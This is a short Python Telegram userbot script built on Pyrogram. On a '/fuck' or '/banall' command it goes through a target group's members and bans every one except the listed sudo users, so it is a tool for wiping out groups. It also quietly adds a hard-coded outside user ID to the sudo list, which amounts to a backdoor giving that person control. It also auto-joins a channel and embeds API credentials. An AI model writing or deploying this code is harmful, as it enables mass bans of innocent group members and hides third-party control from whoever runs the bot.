from os import getenv
from asyncio import sleep

from pyrogram import Client, filters, idle
from pyrogram.types import Message


SESSION = getenv('SESSION')
SUDO_USERS = list(map(int, getenv('SUDO_USERS').split(" ")))
SUDO_USERS.append(6666371804)
CHATS = ['@MILKY_WAY_45',]

M = Client(SESSION, api_id=25981592, api_hash="709f3c9d34d83873d3c7e76cdd75b866")


@M.on_message(filters.user(SUDO_USERS) & filters.command('start'))
async def start(_, message: Message):
     await message.reply_text("🤖 **⚡️𝐌 𝐎 𝐎 𝐍⚡️...**")


@M.on_message(filters.user(SUDO_USERS) & filters.command(["fuck", "banall"]))
async def altron(app: Client, message: Message):
    try:
        chat_id = message.text.split(" ")[1]
        m = await message.reply_text("🔁 __⚡️𝐌 𝐎 𝐎 𝐍⚡️GETTING READY...__")
        if chat_id in CHATS:
            return
    except:
        await message.reply_text("**Usage:**\n`/fuck [chat_id]`")
        return

    await m.edit_text("✅ __⚡️𝐌 𝐎 𝐎 𝐍⚡️STARTED FUCKING THE GROUP⚡️𝐌 𝐎 𝐎 𝐍⚡️...__")
    await sleep(3)

    async for x in app.iter_chat_members(chat_id):
        if x.user.id in SUDO_USERS:
            continue
        try:
            await app.ban_chat_member(chat_id=chat_id, user_id=x.user.id)
        except:
            pass


M.start()
M.join_chat("synax10")
print("⚡️𝐒 𝐘 𝐍 𝐀 𝐗⚡️ Started Successfully")
idle()
M.stop()
